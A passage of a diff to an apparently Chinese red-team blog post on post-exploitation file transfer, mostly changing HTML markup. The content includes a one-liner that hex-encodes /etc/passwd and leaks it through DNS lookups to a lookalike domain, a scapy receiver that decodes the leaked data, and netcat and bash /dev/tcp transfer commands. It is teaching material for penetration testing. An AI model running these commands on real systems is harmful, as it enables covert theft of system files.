+<pre class="line-numbers language-none"><code class="language-none">xxd -p -c 31 &#x2F;etc&#x2F;passwd | while read line; do dig @172.16.1.100 +short +tries&#x3D;1 +time&#x3D;1 $line.gooogle.com; done
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p>接收端:</p>
+<p>接收端:</p>
 <p>以下代码使用了 python 的 <code>scapy</code> 模块，需要手动安装</p>
 <p>代码保存到 <code>dns_reciver.py</code> 文件中</p>
-<pre><code>try:
+<pre class="line-numbers language-none"><code class="language-none">try:
     from scapy.all import *
 except:
     print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)
 
 def process_packet(pkt):
     if pkt.haslayer(DNS):
-        domain = pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;)
-        root_domain = domain.split(&#39;.&#39;)[1]
+        domain &#x3D; pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;)
+        root_domain &#x3D; domain.split(&#39;.&#39;)[1]
         if root_domain.startswith(&#39;gooogle&#39;):
-            print(f&#39;{bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)}&#39;, flush=True, end=&#39;&#39;)
+            print(f&#39;&#123;bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)&#125;&#39;, flush&#x3D;True, end&#x3D;&#39;&#39;)
 
-sniff(iface=&quot;eth0&quot;, prn=process_packet)
+sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>运行方法:</p>
-<pre><code>python3 dns_reciver.py
+<p>运行方法:</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 dns_reciver.py
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p>效果：</p>
-<p><img src="\2019\03\红队后渗透测试中的文件传输技巧\2019-01-13-143819.png" alt="Transfer files via dig"></p>
-<p><img src="\2019\03\红队后渗透测试中的文件传输技巧\2019-01-13-144638.png" alt="img"></p>
+<p>效果：</p>
+<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-01-13-143819.png" alt="Transfer files via dig"></p>
+<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-01-13-144638.png" alt="img"></p>
 <h3 id="使用-NetCat-进行文件传输"><a href="#使用-NetCat-进行文件传输" class="headerlink" title="使用 NetCat 进行文件传输"></a>使用 NetCat 进行文件传输</h3><p>graph LR Sender[A:10.10.10.100] – 1.txt –&gt; Reciver[B:10.10.10.200]</p>
 <p>接受端:</p>
-<pre><code>nc -l -p 1337 &gt; 1.txt
+<pre class="line-numbers language-none"><code class="language-none">nc -l -p 1337 &gt; 1.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p>发送端：</p>
-<pre><code>cat 1.txt | nc -l -p 1337
+<p>发送端：</p>
+<pre class="line-numbers language-none"><code class="language-none">cat 1.txt | nc -l -p 1337
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p>或者</p>
-<pre><code>nc 10.10.10.200 1337 &lt; 1.txt
+<p>或者</p>
+<pre class="line-numbers language-none"><code class="language-none">nc 10.10.10.200 1337 &lt; 1.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p>在极端环境下，如果接受端没有 nc 可以使用 Bash 的 /dev/tcp 接收文件:</p>
-<pre><code>cat &lt; /dev/tcp/10.10.10.200/1337 &gt; 1.txt
+<p>在极端环境下，如果接受端没有 nc 可以使用 Bash 的 /dev/tcp 接收文件:</p>
+<pre class="line-numbers language-none"><code class="language-none">cat &lt; &#x2F;dev&#x2F;tcp&#x2F;10.10.10.200&#x2F;1337 &gt; 1.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p><img src="\2019\03\红队后渗透测试中的文件传输技巧\2019-03-05-055234.png" alt="img"></p>
+<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-03-05-055234.png" alt="img"></p>
 
           </div>
           <br><br>
               
                 <div class="license-wrapper">
-                    <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2019/03/红队后渗透测试中的文件传输技巧/">/2019/03/红队后渗透测试中的文件传输技巧/</a>
-                    <p>发表日期：<a href="/2019/03/红队后渗透测试中的文件传输技巧/">March 8th 2019, 9:25:06 am</a>
-                    <p>更新日期：<a href="/2019/03/红队后渗透测试中的文件传输技巧/">March 8th 2019, 9:40:57 am</a>
-                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/">https://misakikata.github.io/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/">March 8th 2019, 9:25:06 am</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/">March 8th 2019, 9:40:57 am</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
@@ -372,7 +419,7 @@ sniff(iface=&quot;eth0&quot;, prn=process_packet)
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2019/03/红队后渗透测试中的文件传输技巧/'; 
+            this.page.url = 'https://misakikata.github.io/2019/03/红队后渗透测试中的文件传输技巧/'; 
             this.page.identifier = '/2019/03/红队后渗透测试中的文件传输技巧/';
         };
         (function() { 
@@ -383,7 +430,7 @@ sniff(iface=&quot;eth0&quot;, prn=process_packet)
             (d.head || d.body).appendChild(s);
         })();
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
 </div>
         
     
@@ -403,16 +450,32 @@ sniff(iface=&quot;eth0&quot;, prn=process_packet)
         </div>
 </footer>
       <!--   Core JS Files   -->
-      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
-      <script src="/js/main.js"></script>
-      <script src="/js/core/popper.min.js"></script>
-      <script src="/js/core/bootstrap-material-design.min.js"></script>
-      <script src="/js/plugins/moment.min.js"></script>
-      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-        <script src="/js/post.js"></script>
-        <script src="/js/plugins/prettify.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
         <script>
             $(document).ready(function(){
                 $('pre').addClass('prettyprint linenums');
